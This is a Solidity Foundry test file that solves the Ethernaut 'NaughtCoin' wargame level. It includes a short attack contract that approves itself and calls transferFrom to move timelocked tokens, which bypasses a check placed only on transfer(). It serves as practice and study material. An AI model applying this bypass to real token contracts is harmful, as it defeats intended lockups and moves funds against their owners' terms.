// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {NaughtCoinFactory} from "../src/factories/NaughtCoinFactory.sol";
import {NaughtCoin} from "../src/levels/NaughtCoin.sol";

import "forge-std/console.sol";

contract NaughtCoinTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        NaughtCoinFactory factory = new NaughtCoinFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveNaughtCoin() public {
        NaughtCoin coin = NaughtCoin(payable(levelAddress));

        // [START]

        console.log("[Before] player: ", coin.balanceOf(address(this)));

        // 1. Deploy attacker contract
        NaughtCoinAttack attacker = new NaughtCoinAttack(payable(levelAddress));

        // 2. Player approve attacker contract
        coin.approve(address(attacker), coin.balanceOf(address(this)));

        // 3. Call attack
        attacker.attack(address(this));

        console.log("[After] player: ", coin.balanceOf(address(this)));

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

// Attack contract
contract NaughtCoinAttack {
    NaughtCoin public coin;

    constructor(address _coin) public {
        coin = NaughtCoin(_coin);
    }

    function attack(address _target) external {
        uint amount = coin.allowance(_target, address(this));
        coin.transferFrom(_target, address(this), amount);
    }
}
